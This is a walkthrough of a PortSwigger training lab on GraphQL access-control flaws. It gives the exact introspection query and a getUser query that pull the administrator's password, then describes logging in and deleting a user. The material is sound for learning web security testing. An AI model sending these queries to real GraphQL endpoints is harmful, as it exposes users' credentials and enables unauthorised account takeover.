# Lab-2:- [Accidental exposure of private GraphQL fields](https://portswigger.net/web-security/graphql/lab-graphql-accidental-field-exposure)
> PRACTITIONER

The user management functions for this lab are powered by a GraphQL endpoint. The lab contains an access control vulnerability whereby you can induce the API to reveal user credential fields.

**Aim :-** To solve the lab, sign in as the administrator and delete the username carlos. 



## Solution
- Intercept a login request using burp suite.

- The login request is **GraphQL**, send it to repeater.

- Add the following query in the request then send the request
```
{"query": "{__schema{types{name,fields{name}}}}"}
```

- The response contains API schema, bottom of the schema there will be the querys also
```
{
    "name": "query",
    "fields": [
    {
        "name": "getBlogPost"
    },
    {
        "name": "getAllBlogPosts"
    },
    {
        "name": "getUser"
    }
    ]
}
```

- Send the following query in the request to get the user details
```
{"query":"{getUser(id:1){username,password}}"}
```

- Because of the ``` administrator ``` user's id is 1 the server respond with ``` administrator ``` username and password.

- Copy the username and password then login as ``` administrator ```.

- Go to the admin panel then delete the user ``` carlos ```.